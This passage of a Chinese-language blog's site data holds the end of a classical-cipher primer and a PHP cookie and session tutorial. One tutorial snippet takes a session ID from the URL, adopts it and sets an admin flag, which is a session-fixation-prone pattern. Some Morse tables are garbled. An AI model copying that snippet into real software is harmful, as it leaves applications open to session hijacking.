F G H I J K L M N O P Q R S T U V W X Y Z A B C D</p>\n<p>F -F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</p>\n<p>G -G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</p>\n<p>H -H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</p>\n<p>I -I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</p>\n<p>J -J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</p>\n<p>K -K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</p>\n<p>L -L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</p>\n<p>M -M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</p>\n<p>N -N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</p>\n<p>O -O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</p>\n<p>P -P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</p>\n<p>Q -Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</p>\n<p>R -R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</p>\n<p>S -S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</p>\n<p>T -T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</p>\n<p>U -U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</p>\n<p>V -V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</p>\n<p>W -W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</p>\n<p>X -X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</p>\n<p>Y -Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</p>\n<p>Z -Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</p>\n<p>当选定RELATIONS作为密钥时，加密过程是：明文一个字母为T，第一个密钥字母为R，因此可以找到在R行中代替T的为K，依此类推，得出对应关系如下：</p>\n<p>密钥:RELAT IONSR ELATI ONSRE LATIO NSREL</p>\n<p>明文:TOBEO RNOTT OBETH ATIST HEQUE STION</p>\n<p>密文:KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY</p>\n<h2 id=\"11-猪圈密码\"><a href=\"#11-猪圈密码\" class=\"headerlink\" title=\"11.猪圈密码\"></a>11.<strong>猪圈密码</strong></h2><p>遇到了就自行百度密码表</p>\n<h2 id=\"12-rabbit加密：\"><a href=\"#12-rabbit加密：\" class=\"headerlink\" title=\"12.rabbit加密：\"></a>12.<strong>rabbit</strong>加密：</h2><p>特征：有U2Fsd开头</p>\n<h2 id=\"13-utf-7\"><a href=\"#13-utf-7\" class=\"headerlink\" title=\"13.utf-7\"></a>13.<strong>utf-7</strong></h2><p>UTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF）) 是一种可变长度字元编码方式，用以将 Unicode 字元以 ASCII 编码的字元串来呈现，可以应用在<a href=\"http://baike.baidu.com/item/电子邮件\" target=\"_blank\" rel=\"noopener\">电子邮件</a>传输之类的应用。</p>\n<h2 id=\"14-波利比奥斯方阵密码\"><a href=\"#14-波利比奥斯方阵密码\" class=\"headerlink\" title=\"14.波利比奥斯方阵密码\"></a>14.<strong>波利比奥斯方阵密码</strong></h2><p>棋盘密码是利用波利比奥斯方阵(Polybius Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。</p>\n<p>简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。</p>\n<h3 id=\"排列法1：\"><a href=\"#排列法1：\" class=\"headerlink\" title=\"排列法1：\"></a>排列法1：</h3><p>[<img src=\"http://www.lsablog.com/wp-content/uploads/2017/04/Picture1.png\" alt=\"img\"></p>\n<h3 id=\"排列法2：\"><a href=\"#排列法2：\" class=\"headerlink\" title=\"排列法2：\"></a>排列法2：</h3><p><img src=\"http://www.lsablog.com/wp-content/uploads/2017/04/Picture2.png\" alt=\"img\">.</p>\n<h2 id=\"15-摩斯密码：\"><a href=\"#15-摩斯密码：\" class=\"headerlink\" title=\"15.摩斯密码：\"></a>15.摩斯密码：</h2><p>它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>\n<p>密码表：</p>\n<p>A . _ M _ _ Y _ . _ _<br> B _ . . . N _ . Z _ _ . .<br> C _ . _ . O _ _ _ 1 . _ _ _ _<br> D _ . . P . _ _ . 2 . . _ _ _<br> E . Q _ _ . _ 3 . . . _ _<br> F . . _ . R . _ . 4 . . . . _<br> G _ _ . S . . . 5 . . . . .<br> H . . . . T _ 6 _ . . . .<br> I . . U . . _ 7 _ _ . . .<br> J . _ _ _ V . . . _ 8 _ _ _ . .<br> K _ . _ W . _ _ 9 _ _ _ _ .<br> L . _ . . X _ . . _ 0 _ _ _ _ _</p>\n<p>1 =- – – – ？ ==- -==<br> 2 ==- – – / -==-=<br> 3 ===- – （ ) -=- -=-<br> 4 ====- – -====-<br> 5 ===== 。 =-=-=-<br> 6 -====<br> 7 – -===<br> 8 – – -==<br> 9 – – – -=<br> 0 – – – – –</p>\n<h2 id=\"16-当铺密码：\"><a href=\"#16-当铺密码：\" class=\"headerlink\" title=\"16.当铺密码：\"></a>16.<strong>当铺密码：</strong></h2><p>就是一种将中文和<a href=\"http://baike.baidu.com/item/数字/6204\" target=\"_blank\" rel=\"noopener\">数字</a>进行转化的<a href=\"http://baike.baidu.com/item/密码/65553\" target=\"_blank\" rel=\"noopener\">密码</a>，<a href=\"http://baike.baidu.com/item/算法\" target=\"_blank\" rel=\"noopener\">算法</a>相当简单:当前汉字有多少笔画出头，就是转化成数字几。</p>\n<p>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125</p>\n"},{"layout":"post","title":"cookie与session","date":"2020-10-03T16:00:00.000Z","description":"细说cookie与session的原理与作用。","_content":"[toc]\n\n# Cookie\n\ncookie是一种服务端配置在用户电脑上的小文件，用于保存用户信息。因为http(s)是无连接的，所以服务器没法记住同一个用户，从用户的cookie中获取一定的信息（主要用于识别用户），能够帮助服务端处理请求以及提升用户体验。\n\nPHP能够创建或取回cookie的值\n\n## 创建cookie\n\nsetcookie()（或setrawcookie()）用于创建cookie\n\n```php\nsetcookie(name,value,expire,path,domain);\n```\n\n实例1：\n\n```php+HTML\n<?php\nsetcookie('user','Li',time()+3600);\t//设置user的值为'Li',在一小时后过期\n?>\n<html>\n  ...\n</html>\n```\n\n发送cookie时会自动对 cookie值进行url编码，读取时会自动解码，如果不要进行url编码，就可以使用setrawcookie()函数\n\n实例 2:\n\n还可以通过另一种方式设置 cookie 的过期时间。这也许比使用秒表示的方式简单。\n\n```php+HTML\n<?php\n$expire=time()+60*60*24*30;\nsetcookie(\"user\", \"runoob\", $expire);\n?>\n\n<html>\n  ...  \n</html>\n```\n\n## 读取cookie值\n\n $_COOKIE 变量用于取回 cookie 的值。\n\n```php+HTML\n<?php\nif(isset($_COOKIE['user']))\t//用isset()函数来判断是否设置了名为'user'的cookie\n{\n\t$user=$_COOKIE['user'];\t//读取user的值\n    echo '欢迎'.$user.'！</br>';\n}\nelse\n{\n    echo '欢迎，游客！'\n}\nprint_r($_COOKIE);\t//输出所有cookie值\n```\n\n## 删除 Cookie？\n\n当删除 cookie 时，只要使过期日期变更为过去的时间点。\n\n删除的实例：\n\n```php\n<?php\n// 设置 cookie 过期时间为过去 1 小时\nsetcookie(\"user\", \"Li\", time()-3600);\n?>\n```\n\n# Session\n\nPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。\n\n还是由于http(s)无连接的原因，当用户进行了一次操作以后，一般来说，web服务器并不能记住用户，如果用户需要连续，连贯的操作，就会很难受。而通过在服务器上储存session信息来记录用户本次“会话”的临时信息（用户名，身份信息，行为等），可以让服务器知道用户是谁以及做了什么。\n\nSession信息是临时的，在用户离开网站后就会销毁，需要保存的信息只能储存在数据库中\n\n**Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。**\n\n## 开始Session\n\n```php+HTML\n<?php\nsession_start(); \n?>\n \n<html>\n<body>\n \n</body>\n</html>\n```\n\n注意：session_start()函数必须在<html>标签之前。\n\n## 储存和读取session\n\n\n\n## 销毁 Session\n\n如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。\n\nunset() 函数用于释放指定的 session 变量：\n\n**实例**\n\n```php\n<?php \n    session_start(); \n\tif(isset($_SESSION['views']))\n    {    \n        unset($_SESSION['views']);\n    } \n?>\n```\n\n\n\n也可以通过调用 session_destroy() 函数**彻底销毁** session：\n\n**实例**\n\n```php\n<?php \n    session_destroy(); \n?>\n```\n\n# Cookie和Session\n\ncookie储存在用户计算机中且可查询可更改，session处在网站服务器中可见但不可随意更改，从这个角度来说，session比cookie更加安全”一些“。\n\n但session不能完全取代cookie的作用，只有session和cookie一起使用才能带来最高的效率。将一些消息保存在用户端以提高便利性，将一些信息保存在服务端以保证安全性和完整性。\n\n一般来说，用cookie来储存session ID，以帮助服务器实别用户。\n\nsession ID即服务器中保存的session文件的名字，一般形如这样：sess_4c83638b3b0dbf65583181c2f89168ec（后面是32位编码的随机字符，也正是session ID）。这样，当用户第一次访问服务器，服务器生成一个唯一的随机的session ID，并放进一个cookie里发送给客户端，客户端再访问服务器时就会自动带着这个cookie，服务器就能识别用户并找到对应session文件里的信息了（现在还有一种机制叫token，跟这个机制很像，但也有一定的不同，以后单独再开篇文章记录）\n\n以上是客户端开启了cookie服务的情况，如果客户端禁用了cookie，就需要服务器（服务器会判断客户端是否开启了cookie）在url中添加session ID来实现session的传输，\n\n形如 ：www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec\n\n```php\n<?php\n//  保存一天\n$lifeTime = 24 * 3600;\n//  取得当前 Session 名，默认为 PHPSESSID\n$sessionName = session_name();\n//  取得 Session ID\n$sessionID = $_GET[$sessionName];\n//  使用 session_id() 设置获得的 Session ID\nsession_id($sessionID);\n\nsession_set_cookie_params($lifeTime);\nsession_start();\n$_SESSION['admin'] = true;\n?>\n```\n\n或者使用隐藏表单来传输session，自动在表单中添加一个属性为\"hidden\"的<input>,里面提交的是服务器为用户生成的session值。\n\n```html\n<input type=\"hidden\" name=\"PHPSESSID\" value=\"4c83638b3b0dbf65583181c2f89168ec\">\n```\n\n","source":"_posts/2020-10-04-cookie与session.md","raw":"---\nlayout: post\ntitle: cookie与session\ndate: 2020-10-04\ncategories: blog\ntags: [web,php]\ndescription: 细说cookie与session的原理与作用。\n---\n[toc]\n\n# Cookie\n\ncookie是一种服务端配置在用户电脑上的小文件，用于保存用户信息。因为http(s)是无连接的，所以服务器没法记住同一个用户，从用户的cookie中获取一定的信息（主要用于识别用户），能够帮助服务端处理请求以及提升用户体验。\n\nPHP能够创建或取回cookie的值\n\n## 创建cookie\n\nsetcookie()（或setrawcookie()）用于创建cookie\n\n```php\nsetcookie(name,value,expire,path,domain);\n```\n\n实例1：\n\n```php+HTML\n<?php\nsetcookie('user','Li',time()+3600);\t//设置user的值为'Li',在一小时后过期\n?>\n<html>\n  ...\n</html>\n```\n\n发送cookie时会自动对 cookie值进行url编码，读取时会自动解码，如果不要进行url编码，就可以使用setrawcookie()函数\n\n实例 2:\n\n还可以通过另一种方式设置 cookie 的过期时间。这也许比使用秒表示的方式简单。\n\n```php+HTML\n<?php\n$expire=time()+60*60*24*30;\nsetcookie(\"user\", \"runoob\", $expire);\n?>\n\n<html>\n  ...  \n</html>\n```\n\n## 读取cookie值\n\n $_COOKIE 变量用于取回 cookie 的值。\n\n```php+HTML\n<?php\nif(isset($_COOKIE['user']))\t//用isset()函数来判断是否设置了名为'user'的cookie\n{\n\t$user=$_COOKIE['user'];\t//读取user的值\n    echo '欢迎'.$user.'！</br>';\n}\nelse\n{\n    echo '欢迎，游客！'\n}\nprint_r($_COOKIE);\t//输出所有cookie值\n```\n\n## 删除 Cookie？\n\n当删除 cookie 时，只要使过期日期变更为过去的时间点。\n\n删除的实例：\n\n```php\n<?php\n// 设置 cookie 过期时间为过去 1 小时\nsetcookie(\"user\", \"Li\", time()-3600);\n?>\n```\n\n# Session\n\nPHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。\n\n还是由于http(s)无连接的原因，当用户进行了一次操作以后，一般来说，web服务器并不能记住用户，如果用户需要连续，连贯的操作，就会很难受。而通过在服务器上储存session信息来记录用户本次“会话”的临时信息（用户名，身份信息，行为等），可以让服务器知道用户是谁以及做了什么。\n\nSession信息是临时的，在用户离开网站后就会销毁，需要保存的信息只能储存在数据库中\n\n**Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。**\n\n## 开始Session\n\n```php+HTML\n<?php\nsession_start(); \n?>\n \n<html>\n<body>\n \n</body>\n</html>\n```\n\n注意：session_start()函数必须在<html>标签之前。\n\n## 储存和读取session\n\n\n\n## 销毁 Session\n\n如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。\n\nunset() 函数用于释放指定的 session 变量：\n\n**实例**\n\n```php\n<?php \n    session_start(); \n\tif(isset($_SESSION['views']))\n    {    \n        unset($_SESSION['views']);\n    } \n?>\n```\n\n\n\n也可以通过调用 session_destroy() 函数**彻底销毁** session：\n\n**实例**\n\n```php\n<?php \n    session_destroy(); \n?>\n```\n\n# Cookie和Session\n\ncookie储存在用户计算机中且可查询可更改，session处在网站服务器中可见但不可随意更改，从这个角度来说，session比cookie更加安全”一些“。\n\n但session不能完全取代cookie的作用，只有session和cookie一起使用才能带来最高的效率。将一些消息保存在用户端以提高便利性，将一些信息保存在服务端以保证安全性和完整性。\n\n一般来说，用cookie来储存session ID，以帮助服务器实别用户。\n\nsession ID即服务器中保存的session文件的名字，一般形如这样：sess_4c83638b3b0dbf65583181c2f89168ec（后面是32位编码的随机字符，也正是session ID）。这样，当用户第一次访问服务器，服务器生成一个唯一的随机的session ID，并放进一个cookie里发送给客户端，客户端再访问服务器时就会自动带着这个cookie，服务器就能识别用户并找到对应session文件里的信息了（现在还有一种机制叫token，跟这个机制很像，但也有一定的不同，以后单独再开篇文章记录）\n\n以上是客户端开启了cookie服务的情况，如果客户端禁用了cookie，就需要服务器（服务器会判断客户端是否开启了cookie）在url中添加session ID来实现session的传输，\n\n形如 ：www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec\n\n```php\n<?php\n//  保存一天\n$lifeTime = 24 * 3600;\n//  取得当前 Session 名，默认为 PHPSESSID\n$sessionName = session_name();\n//  取得 Session ID\n$sessionID = $_GET[$sessionName];\n//  使用 session_id() 设置获得的 Session ID\nsession_id($sessionID);\n\nsession_set_cookie_params($lifeTime);\nsession_start();\n$_SESSION['admin'] = true;\n?>\n```\n\n或者使用隐藏表单来传输session，自动在表单中添加一个属性为\"hidden\"的<input>,里面提交的是服务器为用户生成的session值。\n\n```html\n<input type=\"hidden\" name=\"PHPSESSID\" value=\"4c83638b3b0dbf65583181c2f89168ec\">\n```\n\n","slug":"2020-10-04-cookie与session","published":1,"updated":"2020-10-04T16:39:06.545Z","comments":1,"photos":[],"link":"","_id":"ckkntx9jg000gxov72k96cr1m","content":"<p>[toc]</p>\n<h1 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h1><p>cookie是一种服务端配置在用户电脑上的小文件，用于保存用户信息。因为http(s)是无连接的，所以服务器没法记住同一个用户，从用户的cookie中获取一定的信息（主要用于识别用户），能够帮助服务端处理请求以及提升用户体验。</p>\n<p>PHP能够创建或取回cookie的值</p>\n<h2 id=\"创建cookie\"><a href=\"#创建cookie\" class=\"headerlink\" title=\"创建cookie\"></a>创建cookie</h2><p>setcookie()（或setrawcookie()）用于创建cookie</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span>value<span class=\"token punctuation\">,</span>expire<span class=\"token punctuation\">,</span>path<span class=\"token punctuation\">,</span>domain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>实例1：</p>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\"><?php\nsetcookie('user','Li',time()+3600);    //设置user的值为'Li',在一小时后过期\n?>\n<html>\n  ...\n</html><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>发送cookie时会自动对 cookie值进行url编码，读取时会自动解码，如果不要进行url编码，就可以使用setrawcookie()函数</p>\n<p>实例 2:</p>\n<p>还可以通过另一种方式设置 cookie 的过期时间。这也许比使用秒表示的方式简单。</p>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\"><?php\n$expire=time()+60*60*24*30;\nsetcookie(\"user\", \"runoob\", $expire);\n?>\n\n<html>\n  ...  \n</html><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"读取cookie值\"><a href=\"#读取cookie值\" class=\"headerlink\" title=\"读取cookie值\"></a>读取cookie值</h2><p> $_COOKIE 变量用于取回 cookie 的值。</p>\n<pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\"><?php\nif(isset($_COOKIE['user']))    //用isset()函数来判断是否设置了名为'user'的cookie\n{\n    $user=$_COOKIE['user'];    //读取user的值\n    echo '欢迎'.$user.'！</br>';\n}\nelse\n{\n    echo '欢迎，游客！'\n}\nprint_r($_COOKIE);    //输出所有cookie值<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"删除-Cookie？\"><a href=\"#删除-Cookie？\" class=\"headerlink\" title=\"删除 Cookie？\"></a>删除 Cookie？</h2><p>当删除 cookie 时，只要使过期日期变更为过去的时间点。</p>\n<p>删除的实例：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token comment\" spellcheck=\"true\">// 设置 cookie 过期时间为过去 1 小时</span>\n<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Li\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">3600</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h1><p>PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p>\n<p>还是由于http(s)无连接的原因，当用户进行了一次操作以后，一般来说，web服务器并不能记住用户，如果用户需要连续，连贯的操作，就会很难受。而通过在服务器上储存session信息来记录用户本次“会话”的临时信息（用户名，身份信息，行为等），可以让服务器知道用户是谁以及做了什么。</p>\n<p>Session信息是临时的，在用户离开网站后就会销毁，需要保存的信息只能储存在数据库中</p>\n<p><strong>Session 的工作机制是：为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。</strong></p>\n<h2 id=\"开始Session\"><a href=\"#开始Session\" class=\"headerlink\" title=\"开始Session\"></a>开始Session</h2><pre class=\"line-numbers language-php+HTML\"><code class=\"language-php+HTML\"><?php\nsession_start(); \n?>\n\n<html>\n<body>\n\n</body>\n</html><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>注意：session_start()函数必须在标签之前。</p>\n<h2 id=\"储存和读取session\"><a href=\"#储存和读取session\" class=\"headerlink\" title=\"储存和读取session\"></a>储存和读取session</h2><h2 id=\"销毁-Session\"><a href=\"#销毁-Session\" class=\"headerlink\" title=\"销毁 Session\"></a>销毁 Session</h2><p>如果您希望删除某些 session 数据，可以使用 unset() 或 session_destroy() 函数。</p>\n<p>unset() 函数用于释放指定的 session 变量：</p>\n<p><strong>实例</strong></p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> \n    <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>    \n        <span class=\"token function\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string\">'views'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> \n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>也可以通过调用 session_destroy() 函数<strong>彻底销毁</strong> session：</p>\n<p><strong>实例</strong></p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span> \n    <span class=\"token function\">session_destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"Cookie和Session\"><a href=\"#Cookie和Session\" class=\"headerlink\" title=\"Cookie和Session\"></a>Cookie和Session</h1><p>cookie储存在用户计算机中且可查询可更改，session处在网站服务器中可见但不可随意更改，从这个角度来说，session比cookie更加安全”一些“。</p>\n<p>但session不能完全取代cookie的作用，只有session和cookie一起使用才能带来最高的效率。将一些消息保存在用户端以提高便利性，将一些信息保存在服务端以保证安全性和完整性。</p>\n<p>一般来说，用cookie来储存session ID，以帮助服务器实别用户。</p>\n<p>session ID即服务器中保存的session文件的名字，一般形如这样：sess_4c83638b3b0dbf65583181c2f89168ec（后面是32位编码的随机字符，也正是session ID）。这样，当用户第一次访问服务器，服务器生成一个唯一的随机的session ID，并放进一个cookie里发送给客户端，客户端再访问服务器时就会自动带着这个cookie，服务器就能识别用户并找到对应session文件里的信息了（现在还有一种机制叫token，跟这个机制很像，但也有一定的不同，以后单独再开篇文章记录）</p>\n<p>以上是客户端开启了cookie服务的情况，如果客户端禁用了cookie，就需要服务器（服务器会判断客户端是否开启了cookie）在url中添加session ID来实现session的传输，</p>\n<p>形如 ：<a href=\"http://www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec\" target=\"_blank\" rel=\"noopener\">www.xxx.com?PHPSESSID=4c83638b3b0dbf65583181c2f89168ec</a></p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token comment\" spellcheck=\"true\">//  保存一天</span>\n<span class=\"token variable\">$lifeTime</span> <span class=\"token operator\">=</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">3600</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//  取得当前 Session 名，默认为 PHPSESSID</span>\n<span class=\"token variable\">$sessionName</span> <span class=\"token operator\">=</span> <span class=\"token function\">session_name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//  取得 Session ID</span>\n<span class=\"token variable\">$sessionID</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$sessionName</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\" spellcheck=\"true\">//  使用 session_id() 设置获得的 Session ID</span>\n<span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sessionID</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">session_set_cookie_params</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$lifeTime</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string\">'admin'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>或者使用隐藏表单来传输session，自动在表单中添加一个属性为”hidden”的<input>,里面提交的是服务器为用户生成的session值。</p>\n<pre class=\"line-numbers language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>PHPSESSID<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>4c83638b3b0dbf65583181c2f89168ec<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ai